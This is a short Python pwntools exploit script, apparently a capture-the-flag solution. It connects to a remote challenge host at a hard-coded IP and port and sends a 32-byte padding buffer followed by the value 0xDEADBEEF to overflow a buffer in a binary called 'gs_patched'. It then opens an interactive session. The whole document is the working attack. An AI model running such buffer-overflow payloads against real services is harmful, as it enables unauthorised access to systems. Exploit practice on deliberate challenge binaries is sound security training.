#!/usr/bin/env python3

from pwn import *

exe = ELF("./gs_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
#p = process()
p = remote('94.237.50.94',47350)

payload = b'a'*32
payload += p64(0xDEADBEEF)
p.sendline(payload)

p.interactive()
